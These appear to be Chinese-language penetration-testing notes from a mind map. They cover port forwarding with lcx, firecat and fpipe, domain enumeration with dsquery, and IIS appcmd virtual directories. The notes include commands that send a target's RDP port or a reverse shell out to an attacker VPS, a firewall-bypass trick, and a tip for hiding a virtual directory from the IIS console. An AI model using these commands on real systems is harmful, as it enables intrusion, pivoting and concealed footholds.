            • 端口转发
              • + - lcx

                • 无人不晓的端口转发工具
                  反弹模式（反弹目标3389），listen先监听本地80端口，-slave客户端传输本地3389端口到vps 80端口
                  on vps：lcx -listen 80 51
                  in target：lcx -slave  vps  80  127.0.0.1 3389
                  使用：mstsc /console /v:127.0.0.1:51
                  传输模式，将访问本机8080重定向到192.168.1.9的22端口
                  in target： lcx -tran  8080 192.168.1.9 22
                  http://www.cnblogs.com/hiccup/p/4421114.html

              • + - firecat

                • 将内网192.168.1.9 22端口反弹到vps 80端口
                  on vps：firecat.exe -m 0 -t 80 -s 51
                  in target：firecat-win32.exe -m 1 -h vps -t 80 -H 192.168.1.9 -s 22
                  使用：ssh -p 51 root@127.0.0.1
                  反弹目标机shell
                  firecat-win32.exe -m 1 -h vps -t 80 -H 127.0.0.1 -e
                  使用：telnet 127.0.0.1 51
                  不支持端口透明转发
                  -e 参数可以让你获得一个回连shell，开源代码
                  https://www.bishopfox.com/resources/tools/other-free-tools/firecat/
                  https://github.com/ru0/firecat2（去除shell功能）

                • 可以自定义的-s源端口参数让你轻松bypass firewall
                  将连接到本地53端口的数据转发到192.168.1.9的22端口（-s 指定出站源端口）
                  in target：fpipe -l 53 -s 23 -r 22 192.168.1.9
                  http://www.mcafee.com/us/downloads/free-tools/fpipe.aspx

            • + - Dsquery
              Queries the directory by using search criteria that you specify.

              • dsquery computer - finds computers in the directory.
                dsquery contact - finds contacts in the directory.
                dsquery subnet - finds subnets in the directory.
                dsquery group - finds groups in the directory.
                dsquery ou - finds organizational units in the directory.
                dsquery site - finds sites in the directory.
                dsquery server - finds domain controllers in the directory.
                dsquery user - finds users in the directory.
                dsquery quota - finds quota specifications in the directory.
                dsquery partition - finds partitions in the directory.
                dsquery * - finds any object in the directory by using a generic LDAP query.

                查询计算机名字包含VM的机器（默认是从domainroot节点开始搜索）
                dsquery computer domainroot -limit 0 -o samid -name *VM*
                查找域控制器（友好名字显示）
                dsquery server -o rdn -forest
                在组织单元Test中查询以jon开头的用户
                dsquery user OU=Test,DC=Contoso,DC=Com -o upn -name jon*

          • + - Appcmd.exe (IIS 7)

            • Applies To: Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Vista
              IIS 7 provides a new command-line tool, Appcmd.exe, to configure and query objects on your Web server, and to return output in text or XML. The following examples are tasks that you can complete with Appcmd.exe:
              *Create and configure sites, applications, application pools, and virtual directories.
              *Start and stop sites.
              *Start, stop, and recycle application pools.
              *View information about worker processes and requests that are running on the Web server.

              To add an application to a site, use the following syntax:
              appcmd add app /site.name: string /path: string /physicalPath: string
              The variable site.namestring is the name of the Web site to which you want to add the application. The variable pathstring is the virtual path of the application, such as /application, and physicalPathstring is the physical path of the application's content in the file system.
              For example, to add an application named marketing to a site named contoso, with content at c:\application, type the following at the command prompt, and then press ENTER:
              appcmd add app /site.name: contoso /path:/ marketing /physicalPath:c:\ application

              appcmd list site (列出当前存在的站点)
              虚拟目录必须是二级,IIS控制台才无法看到

              添加虚拟目录
              %windir%\system32\inetsrv\appcmd add vdir /app.name:"Default Web Site/" /path:/cache/tmp /physicalPath:"C:\Program Files\IIS\Microsoft Web Deploy"
              列出虚拟目录
              %windir%\system32\inetsrv\appcmd list vdir /app.name:"Default Web Site/"
              删除虚拟目录
              %windir%\system32\inetsrv\appcmd delete vdir "Default Web Site/cache/tmp"
